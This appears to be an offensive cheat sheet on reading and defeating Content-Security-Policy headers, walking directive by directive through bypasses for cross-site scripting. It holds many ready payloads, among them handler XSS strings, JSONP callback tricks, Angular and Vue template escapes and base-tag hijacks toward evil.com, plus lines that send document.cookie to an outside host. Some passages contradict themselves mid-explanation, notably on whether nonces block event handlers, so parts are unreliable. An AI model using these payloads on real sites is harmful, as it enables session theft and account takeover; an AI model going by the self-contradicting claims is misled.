# CSP — reading the policy and beating it

Content-Security-Policy decides which payloads survive — read it
before building. This file is the directive-by-directive map plus
the bypass shapes per directive weakness.

The policy lives in the `Content-Security-Policy` response header
(or `<meta http-equiv>` — the meta version lacks `frame-ancestors`,
`report-uri`, `sandbox`).

---

## 1. Read the policy — the directive parse

```text
Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://cdn.x.com 'nonce-abc123' 'strict-dynamic';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data:;
  connect-src 'self' https://api.x.com;
  object-src 'none';
  base-uri 'self';
  form-action 'self';
  frame-ancestors 'none';
```

Key questions in order:

```text
[ ] is 'unsafe-inline' in script-src?    → inline scripts+handlers run
[ ] is 'unsafe-eval' there?              → eval/Function allowed
[ ] is strict-dynamic present?           → nonces propagate, hosts ignored
[ ] is a nonce required?                 → leak/reuse a nonce
[ ] which hosts allowed for script-src?  → JSONP/CDN/hosted gadgets
[ ] are data:/blob: URIs allowed?        → data-uri script sources
[ ] connect-src open?                    → exfil channel allowed
[ ] img-src default-*?                   → exfil via <img> beacon
[ ] base-uri set?                        → base-hijack possible
[ ] object-src missing?                  → plugin fallback (rare)
```

A missing directive falls back to `default-src`; missing
`default-src` = unrestricted for that resource type.

---

## 2. `unsafe-inline` — the free pass

```text
script-src 'unsafe-inline' ...anything
→ every inline <script> and every on* handler runs — full corpus
```

Payload = the normal ones; CSP is not a barrier. The check is
`'unsafe-inline'` PRESENT without a nonce requirement (nonce +
unsafe-inline still requires the nonce on modern browsers).

---

## 3. `unsafe-eval` — eval paths open

```text
script-src 'unsafe-eval'
→ eval() Function() setTimeout('code') all run —
  needed for some exfil shapes but not a bypass by itself
```

Useful when combined with a `<script src>` allowlist — pull the
payload via an allowed script src then eval a string inside.

---

## 4. nonce — leak, reuse, inject

```text
script-src 'nonce-abc123'
→ only <script nonce="abc123"> runs
```

Bypasses:

- **Reuse the page's nonce** — the nonce lands in the response; if
  the injected HTML can contain `<script nonce="abc123">` it runs.
  Extraction: the nonce is visible in any existing script tag:

  ```javascript
  document.querySelector('script[nonce]').nonce
  document.querySelector('script').getAttribute('nonce')
  document.scripts[0].nonce
  ```

  If you can execute ANY script (a DOM gadget, an event handler
  that doesn't need a nonce — handlers don't!), read the nonce then
  inject a fresh `<script nonce=stolen>` via innerHTML/dom.

- **Nonce inside attribute** — if the nonce value lands where you
  can inject (a JSON blob, a reflected param), read it directly.
- **Base-tag / injection-point nonce** — inject your script tag
  BEFORE CSP's nonce-checking markup... doesn't work; nonces are
  validated per-element.
- **`nonce` on a `<link rel=preload>` or `<style>`** — different
  directive; style nonces don't gate scripts.

Event handlers are NOT nonce-gated: `<img src=x onerror=alert(1)>`
runs under `script-src 'nonce-x'` — the bypass payload is always
the handler family when `unsafe-inline` is absent:

```html
<img src=x onerror=alert(1)>         -- runs regardless of nonce
<svg onload=alert(1)>                -- runs
<iframe onload=alert(1)>             -- runs
```

That's the #1 CSP-bypass trick — `script-src` gates script ELEMENTS,
not `on*` attributes. `unsafe-inline` controls handlers — if the
policy lacks `unsafe-inline` but also lacks explicit handler
blocking, handlers still run (CSP2 treated them as inline;
CSP3 unchanged for `on*` attrs = they need `unsafe-inline` to run!
Actually: CSP3 spec puts `on*` handlers under `unsafe-inline`.)

The truth: `script-src 'nonce-x'` WITHOUT `unsafe-inline` BLOCKS
on* handlers too. The handler-family bypass only works when
`unsafe-inline` IS present or `script-src-attr` is open.

---

## 5. `strict-dynamic` — nonce inheritance, hosts ignored

```text
script-src 'nonce-abc123' 'strict-dynamic'
→ a script loaded WITH a valid nonce can load other scripts
  WITHOUT the host needing to be in the allowlist
```

Bypasses:

- If you have a valid nonce (leaked/injected) → load ANY src.
- A whitelisted script that loads other scripts transitively —
  your payload lands in the transitively-loaded script.
- `https:` scheme in script-src + strict-dynamic → strict-dynamic
  drops host-checking → still need the nonce.
- The `unsafe-inline`+`strict-dynamic` combo: strict-dynamic makes
  `unsafe-inline` IGNORED for script elements — inline scripts
  blocked, only nonce'd or dynamically-loaded scripts run.
- BUT `on*` handlers aren't script elements — `strict-dynamic`
  doesn't change handler rules (still need `unsafe-inline`).

---

## 6. Allowed-host gadget attacks — the CDN/JSONP problem

`script-src 'self' https://cdn.x.com` — scripts from cdn.x.com are
allowed. The bypass: find a script ON THE ALLOWED HOST that does
what you want:

```html
<!-- JSONP endpoint on an allowed host — callback = your code: -->
<script src="https://cdn.x.com/jsonp?callback=alert"></script>
   → response: alert({"data":...}) — alert() IS your callback name
<script src="https://cdn.x.com/jsonp?cb=fetch`//me`//"></script>
<script src="https://api.x.com/u?callback=eval(name)"></script>
```

Known gadget libraries on CDNs (Angular is the famous one):

```html
<!-- Angular app + cdn allowlist: the ng-* gadgets execute -->
<script src="https://cdn.x.com/angular.min.js"></script>
<div ng-app>{{'a'.constructor.prototype.charAt=[].join;
   $eval('x=1};alert(1);//')}}</div>
<!-- angular 1.x sandbox escape — version-specific, see gadgets.md -->
```

Probe the allowlist hosts for: JSONP endpoints (`?callback=`/
`?cb=`/`?jsonp=`), user-content endpoints, reflectors that echo
`callback(...)` — the callback name is YOUR function.

The `connect-src` sibling — `connect-src *` means fetch/XHR to
anywhere: exfil is trivial.

---

## 7. `data:`/`blob:` script sources

```text
script-src data:
→ <script src="data:text/javascript,alert(1)"></script> runs

script-src blob:
→ <script src="blob:..."> only YOUR blob — needs script to create
→ dead end unless you already have JS

img-src data: → exfil via <img src=data:...>? no — data: img-src
  only gates LOADING images, not exfil; exfil uses ANY reachable
  scheme — img-src 'self' + data: still lets <img src=//me/> fail
  CSP-check... img-src 'self' blocks loading from //me — use
  connect-src or a different scheme for exfil
```

`script-src data:` is the rare gold — mostly seen in legacy SPAs.

---

## 8. base-uri — hijack every relative URL

```text
no base-uri directive → inject <base href="//me/">
→ every relative <script src="/x.js"> resolves to //me/x.js
→ every <a href="/y"> resolves to your host
```

```html
<base href="//evil.com/">
<base href="javascript:alert(1)//">     -- scheme hijack (theoretical)
<base target="_blank" href="//me/">
```

`base-uri 'none'`/`'self'` blocks this; missing base-uri = open.

---

## 9. `frame-ancestors` / framing — clickjacking, not XSS

`frame-ancestors 'none'` prevents framing — its absence lets you
EMBED the page in yours. Clickjacking territory, not XSS — but the
frame trick can steal values via `window.frames[0].document` if
same-origin.

`sandbox` directive — applies iframe-sandbox rules to the page
itself: `sandbox allow-scripts` strips forms/popups — relevant when
the page IS sandboxed.

---

## 10. `connect-src`/`img-src`/`media-src` — the EXFIL gates

Exfil needs SOME allowed channel:

```javascript
// connect-src 'self' https://api.x.com → fetch only to self+api:
fetch('/api/x?d='+document.cookie)         -- self-fetch + get readback?
fetch('https://api.x.com/?d='+document.cookie)  -- allowed host exfil

// img-src 'self' data: → img only to self+data — exfil via:
new Image().src='/track?d='+document.cookie      -- same-origin fetch
new Image().src='data:...'                        -- nope, self-only
// BUT: if img-src includes * or https://*: → free

// the fallback — the app itself:
document.forms[0].value = document.cookie; document.forms[0].submit();
   -- writes the cookie INTO THE APP — exfil-methods.md §6

// if NO outbound at all → app-as-channel (exfil-methods.md §7)
```

`default-src` gates everything without a specific directive —
`img-src` missing → `default-src` controls it.

---

## 11. `script-src-attr`/`elem`/`src-attr` — the CSP3 granularity

```text
script-src-elem  <script src=...>            (elements)
script-src-attr  onclick=... onerror=...      (attributes/handlers)
script-src       (both — the parent directive)
style-src-elem / style-src-attr               (css)
```

The granular split: `script-src-attr 'unsafe-inline'` allows
handlers; `script-src-elem 'self'` allows script files — these can
differ. A policy listing `script-src-elem 'self'` without
`script-src-attr` inherits `script-src` — which may lack the
attr coverage.

---

## 12. `require-trusted-types` — DOM-sink gate

```text
require-trusted-types-for 'script'
→ innerHTML assignments must be TrustedHTML objects —
  string assignments FAIL
```

Bypasses:

- `trustedTypes.createPolicy` — if the page has an existing policy
  with a permissive createHTML, reuse it.
- A `default` policy — `trustedTypes.createPolicy('default', ...)`
  intercepts all sinks — if the page defines a default policy that
  sanitizes weakly, inject through it.
- The gate only applies to 'script' sinks — `src`/`href`/`text`
  assignments pass through.
- DOM clobbering a TrustedType policy name.

---

## 13. The gadget chain — CSP'd app + allowed library

The classic chain: CSP allows `cdn.x.com` which hosts Angular —
inject Angular markup, the library's own template-eval does the
rest:

```html
<script src="https://cdn.x.com/angular/1.5.9/angular.min.js"></script>
<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
<div ng-app>{{$on.init = eval('alert(1)')}}</div>
```

Angular-specific sandbox escapes are version-locked —
`gadgets.md` §2 has the per-version escape table. Other gadget
libraries:

- Vue: `{{constructor.constructor('alert(1)')()}}` template eval
- jQuery: `$(...)` global-eval selectors (deprecated)
- Polymer/Riot/Mithril: template-eval surfaces
- `cdn.js`'s `callback=`/`jsonp` endpoints

---

## 14. The nonce-reuse chain — the practical endgame

CSP'd app, you found a nonce + an injection point:

```html
<script nonce="LEAKED_NONCE">
fetch('//me/?c='+document.cookie)
</script>
```

Or — handlers blocked? — inject a nonce'd script tag pointing at
an allowed host:

```html
<script nonce="LEAKED" src="https://allowed.com/jsonp?cb=alert">
</script>
```

Or — nonce'd + `data:` allowed:

```html
<script nonce="LEAKED"
   src="data:text/javascript,alert(1)"></script>
```

Or — the DOM-gadget route: handler executes (if `unsafe-inline`
present), reads nonce, injects a fresh script tag with it.

---

## 15. report-only — the deceptive CSP

`Content-Security-Policy-Report-Only` — LOGS violations but
doesn't block: the page behaves as if CSP were absent. Read the
header NAME carefully.

`report-uri`/`report-to` endpoints can receive violation reports —
sometimes usable as an exfil channel: trigger a violation that
carries your data in the blocked-uri field.

---

## 16. The CSP bypass decision table

| Policy shape | Bypass |
|---|---|
| `unsafe-inline` | everything works |
| `nonce-x` | handlers if `unsafe-inline` too; else leak the nonce |
| `nonce-x` + `strict-dynamic` | nonce'd script loads anything |
| `https:`/`*.x.com` allowlist | JSONP/gadget on allowed host |
| `data:` | data: script src |
| missing `script-src` | `default-src` rules |
| `default-src 'self'` only | everything same-origin — no inline |
| `report-only` | treat as no CSP |
| `require-trusted-types` | DOM sinks gated — JS-string or URL contexts still work |
| `script-src-attr` present | granular rules — check each |

---

## 17. Meta-CSP quirks

`<meta http-equiv="Content-Security-Policy" content="...">` —
injected into the page itself:

```html
<meta http-equiv="Content-Security-Policy"
      content="script-src 'unsafe-inline'">
   -- injected BEFORE the real meta → first policy wins? Actually
      the LAST policy wins for meta — inject YOUR lax policy after
      the strict one? no — multiple CSP headers are AND-ed (both
      must pass); meta follows the same rule — adding a meta CSP
      can only TIGHTEN, never loosen. Skip.
```

You cannot weaken a CSP via injected meta — you CAN'T add a policy
that loosens; all policies intersect. The reverse: an injected meta
CSP can tighten a page to break its own JS (a denial primitive,
sometimes useful for disabling defense scripts).
